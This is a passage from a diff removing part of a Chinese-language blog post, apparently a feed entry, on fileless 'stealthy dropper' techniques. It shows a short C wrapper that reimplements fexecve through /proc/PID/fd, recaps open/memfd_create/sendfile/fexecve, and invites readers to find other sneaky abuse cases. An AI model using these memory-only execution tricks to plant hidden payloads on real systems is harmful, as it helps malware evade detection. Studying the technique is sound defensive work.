-<li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">my_fexecve (int fd, char **arg, char **env) &#123;</span><br><span class="line">  char  fname[1024];</span><br><span class="line"></span><br><span class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</span><br><span class="line">  execve (fname, arg, env);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
-<li>读完这篇文章，你应该了解了之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li>
-<li>这篇文章中作者是以打开xeye程序为示例，那么你有其它猥琐的利用场景吗 ；P<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="noopener">Super-Stealthy Droppers</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
     
     </summary>
     
